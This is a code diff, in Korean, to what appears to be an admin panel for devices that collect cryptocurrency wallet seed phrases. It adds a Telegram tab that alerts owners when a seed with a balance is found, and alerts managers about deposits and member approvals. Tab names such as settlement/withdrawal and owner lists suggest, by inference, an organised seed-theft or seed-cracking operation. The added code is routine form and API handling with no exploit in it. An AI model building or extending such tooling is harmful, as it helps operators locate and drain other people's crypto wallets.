@@ -584,6 +584,9 @@
       <button class="nav-item" data-tab="tabDownloads" onclick="switchTab('tabDownloads');loadDownloadItems()">
         <span class="nav-icon">⬇️</span><span>다운로드</span>
       </button>
+      <button class="nav-item" data-tab="tabTelegram" onclick="switchTab('tabTelegram');loadOwnerTgBot()">
+        <span class="nav-icon">📣</span><span>텔레그램</span>
+      </button>
       <button class="nav-item" data-tab="tabMyAccount" onclick="switchTab('tabMyAccount')">
         <span class="nav-icon">👤</span><span>내 계정</span>
       </button>
@@ -713,6 +716,48 @@
         </div>
       </div>
     </div><!-- /tabDownloads -->
+
+    <!-- ===== 탭: 텔레그램 알림 설정 (역할별) ===== -->
+    <div class="tab-panel" id="tabTelegram">
+      <div class="glass-card owner-tab">
+        <div class="section-header">
+          <span class="section-title">텔레그램 — 시드 잔고 발견 알림</span>
+        </div>
+        <p style="font-size:13px;color:var(--muted);margin-bottom:14px;line-height:1.6;">
+          소속 기기에서 <b>시드 문구에 잔고가 잡히면</b> 이 봇으로 알림을 받습니다. (마스터 방과 별도)<br>
+          봇 1개 + 해당 방의 <b>Chat ID</b>만 입력하세요.
+        </p>
+        <div style="max-width:480px;display:grid;gap:12px;">
+          <div class="form-group" style="margin:0;"><label>봇 Token</label><input type="text" id="ownTgBotToken" placeholder="BotFather 토큰"></div>
+          <div class="form-group" style="margin:0;"><label>Chat ID (시드 발견)</label><input type="text" id="ownTgChatSeed" placeholder="-100..."></div>
+          <div style="display:flex;flex-wrap:wrap;gap:8px;">
+            <button class="btn-ac btn-sm" onclick="saveOwnerTgBot()">저장</button>
+            <button class="btn-ghost btn-sm" onclick="testOwnerTgBot()">테스트 전송</button>
+          </div>
+          <p id="ownTgMsg" style="font-size:13px;min-height:18px;"></p>
+        </div>
+      </div>
+      <div class="glass-card mgr-tab" style="margin-top:12px;">
+        <div class="section-header">
+          <span class="section-title">텔레그램 — 입금 / 회원승인</span>
+        </div>
+        <p style="font-size:13px;color:var(--muted);margin-bottom:14px;line-height:1.6;">
+          <b>입금 확인</b> 방과 <b>회원·오너 승인 요청</b> 방을 나눌 수 있습니다. 비워 두면 예전 단일 Chat ID 필드 값이 백업으로 쓰입니다.
+        </p>
+        <div style="max-width:480px;display:grid;gap:12px;">
+          <div class="form-group" style="margin:0;"><label>봇 Token</label><input type="text" id="mgrTgBotToken" placeholder="BotFather 토큰"></div>
+          <div class="form-group" style="margin:0;"><label>Chat ID — 입금</label><input type="text" id="mgrTgChatDeposit" placeholder="-100..."></div>
+          <div class="form-group" style="margin:0;"><label>Chat ID — 회원승인</label><input type="text" id="mgrTgChatApproval" placeholder="-100..."></div>
+          <div class="form-group" style="margin:0;"><label>Chat ID (레거시·선택)</label><input type="text" id="mgrTgChatId" placeholder="백업용"></div>
+          <div style="display:flex;flex-wrap:wrap;gap:8px;">
+            <button class="btn-ac btn-sm" onclick="saveOwnerTgBot()">저장</button>
+            <button class="btn-ghost btn-sm" onclick="testOwnerTgBot('deposit')">테스트·입금</button>
+            <button class="btn-ghost btn-sm" onclick="testOwnerTgBot('approval')">테스트·승인</button>
+          </div>
+          <p id="mgrTgMsg" style="font-size:13px;min-height:18px;"></p>
+        </div>
+      </div>
+    </div><!-- /tabTelegram -->
 
     <!-- ===== 탭: 내 계정 ===== -->
     <div class="tab-panel" id="tabMyAccount">
@@ -1196,7 +1241,8 @@
   /* ===================== TAB ===================== */
   const _tabTitles = {
     tabDevices: '기기 목록', tabCreate: '계정 생성',
-    tabSeeds: '시드 현황', tabDownloads: '다운로드', tabMyAccount: '내 계정',
+    tabSeeds: '시드 현황', tabDownloads: '다운로드', tabTelegram: '텔레그램',
+    tabMgrOwners: '내 오너 목록', tabMgrSettle: '정산/출금', tabMyAccount: '내 계정',
   };
   function switchTab(id) {
     document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
@@ -1208,6 +1254,63 @@
     if (titleEl) titleEl.textContent = _tabTitles[id] || '';
     if (window.innerWidth <= 768) closeSidebar();
     if (id === 'tabMyAccount') _updateThemeBtns();
+    if (id === 'tabTelegram') loadOwnerTgBot();
+  }
+
+  /* ===================== TELEGRAM (owner / manager) ===================== */
+  async function loadOwnerTgBot() {
+    const oMsg = document.getElementById('ownTgMsg');
+    const mMsg = document.getElementById('mgrTgMsg');
+    if (oMsg) oMsg.textContent = '';
+    if (mMsg) mMsg.textContent = '';
+    try {
+      const r = await ownerFetch('/api/owner/telegram-bot');
+      const d = await r.json();
+      if (!r.ok) return;
+      if (_role === 'manager') {
+        document.getElementById('mgrTgBotToken').value = d.botToken || '';
+        document.getElementById('mgrTgChatId').value = d.chatId || '';
+        document.getElementById('mgrTgChatDeposit').value = d.chatDeposit || '';
+        document.getElementById('mgrTgChatApproval').value = d.chatApproval || '';
+      } else {
+        document.getElementById('ownTgBotToken').value = d.botToken || '';
+        document.getElementById('ownTgChatSeed').value = d.chatSeed || '';
+      }
+    } catch (_) {}
+  }
+  async function saveOwnerTgBot() {
+    const isMgr = _role === 'manager';
+    const msgEl = document.getElementById(isMgr ? 'mgrTgMsg' : 'ownTgMsg');
+    msgEl.textContent = '';
+    try {
+      const body = isMgr
+        ? {
+            botToken: document.getElementById('mgrTgBotToken').value.trim(),
+            chatId: document.getElementById('mgrTgChatId').value.trim(),
+            chatDeposit: document.getElementById('mgrTgChatDeposit').value.trim(),
+            chatApproval: document.getElementById('mgrTgChatApproval').value.trim(),
+          }
+        : {
+            botToken: document.getElementById('ownTgBotToken').value.trim(),
+            chatSeed: document.getElementById('ownTgChatSeed').value.trim(),
+          };
+      const r = await ownerFetch('/api/owner/telegram-bot', 'PUT', body);
+      const data = await r.json();
+      if (!r.ok) { msgEl.style.color = 'var(--err)'; msgEl.textContent = data.error || '저장 실패'; return; }
+      msgEl.style.color = 'var(--ok)'; msgEl.textContent = '저장되었습니다.';
+    } catch (e) { msgEl.style.color = 'var(--err)'; msgEl.textContent = e.message || '오류'; }
+  }
+  async function testOwnerTgBot(channel) {
+    const isMgr = _role === 'manager';
+    const msgEl = document.getElementById(isMgr ? 'mgrTgMsg' : 'ownTgMsg');
+    msgEl.textContent = '전송 중...';
+    msgEl.style.color = 'var(--muted)';
+    try {
+      const r = await ownerFetch('/api/owner/telegram-bot/test', 'POST', isMgr ? { channel: channel || 'deposit' } : {});
+      const data = await r.json();
+      if (!r.ok) { msgEl.style.color = 'var(--err)'; msgEl.textContent = data.error || '실패'; return; }
+      msgEl.style.color = 'var(--ok)'; msgEl.textContent = '테스트 메시지를 보냈습니다.';
+    } catch (e) { msgEl.style.color = 'var(--err)'; msgEl.textContent = e.message || '오류'; }
   }
 
   /* ===================== DEVICES ===================== */
